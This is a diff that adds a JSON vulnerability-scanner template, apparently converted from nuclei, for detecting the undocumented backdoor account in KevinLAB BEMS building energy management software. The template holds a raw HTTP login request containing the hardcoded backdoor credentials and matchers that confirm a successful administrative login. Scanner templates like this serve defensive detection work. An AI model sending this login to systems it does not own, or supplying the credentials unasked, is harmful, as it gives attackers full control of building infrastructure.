@@ -1,0 +1,160 @@
+{
+  "id": "kevinlab-bems-backdoor",
+  "name": "KevinLAB BEMS (Building Energy Management System) - Backdoor Detection",
+  "author": "gy741",
+  "severity": "CRITICAL",
+  "description": "KevinLAB BEMS has an undocumented backdoor account, and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel, and it also uses an undocumented privilege level (admin_pk\u003d1) which allows full availability of the features that the BEMS is offering remotely.",
+  "references": [
+    "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php"
+  ],
+  "tags": [
+    "kevinlab",
+    "backdoor"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /http/index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q\u003d0.01\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nrequester\u003dlogin\u0026request\u003dlogin\u0026params\u003d%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%2C%7B%22name%22%3A%22device_key%22%2C%22value%22%3A%22a2fe6b53-e09d-46df-8c9a-e666430e163e%22%7D%2C%7B%22name%22%3A%22auto_login%22%2C%22value%22%3Afalse%7D%2C%7B%22name%22%3A%22login_key%22%2C%22value%22%3A%22%22%7D%5D\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "data\":\"[A-Za-z0-9-]+",
+            "login_key\":\"[A-Za-z0-9-]+"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"result\":true"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "kevinlab-bems-backdoor",
+    "info": {
+      "name": "KevinLAB BEMS (Building Energy Management System) - Backdoor Detection",
+      "author": "gy741",
+      "severity": "critical",
+      "description": "KevinLAB BEMS has an undocumented backdoor account, and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel, and it also uses an undocumented privilege level (admin_pk\u003d1) which allows full availability of the features that the BEMS is offering remotely.",
+      "reference": [
+        "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "kevinlab,backdoor"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /http/index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q\u003d0.01\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nrequester\u003dlogin\u0026request\u003dlogin\u0026params\u003d%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%2C%7B%22name%22%3A%22device_key%22%2C%22value%22%3A%22a2fe6b53-e09d-46df-8c9a-e666430e163e%22%7D%2C%7B%22name%22%3A%22auto_login%22%2C%22value%22%3Afalse%7D%2C%7B%22name%22%3A%22login_key%22%2C%22value%22%3A%22%22%7D%5D\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "data\":\"[A-Za-z0-9-]+",
+              "login_key\":\"[A-Za-z0-9-]+"
+            ],
+            "condition": "or",
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"result\":true"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
